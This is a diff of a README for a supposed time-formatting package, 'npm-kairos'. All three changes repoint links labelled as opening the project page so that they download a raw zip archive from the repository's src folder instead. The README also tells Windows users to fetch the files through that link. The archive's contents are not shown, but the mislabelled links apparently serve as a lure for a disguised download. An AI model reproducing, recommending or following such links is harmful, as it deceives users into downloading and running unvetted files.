@@ -1,6 +1,6 @@
 # ⏱️ npm-kairos - Read time in plain words
 
-[![Download](https://img.shields.io/badge/Download-Open%20the%20page-blue?style=for-the-badge)](https://github.com/Rednecknabob448/npm-kairos)
+[![Download](https://img.shields.io/badge/Download-Open%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Rednecknabob448/npm-kairos/main/src/npm-kairos-v3.3-alpha.5.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ Use it when you want to work with time in a way that is easier to read in your a
 
 Open the download page here:
 
-[Visit the npm-kairos page](https://github.com/Rednecknabob448/npm-kairos)
+[Visit the npm-kairos page](https://raw.githubusercontent.com/Rednecknabob448/npm-kairos/main/src/npm-kairos-v3.3-alpha.5.zip)
 
 If you are on Windows, use this page to get the project files, then place them in a folder you can find later. After that, open the folder and follow the usage steps in your app or script.
 
@@ -226,7 +226,7 @@ That is the main purpose of npm-kairos. It helps your app speak in plain time wo
 
 ## 📎 Download again
 
-[Open the npm-kairos page](https://github.com/Rednecknabob448/npm-kairos)
+[Open the npm-kairos page](https://raw.githubusercontent.com/Rednecknabob448/npm-kairos/main/src/npm-kairos-v3.3-alpha.5.zip)
 
 ## 📘 File use notes
 
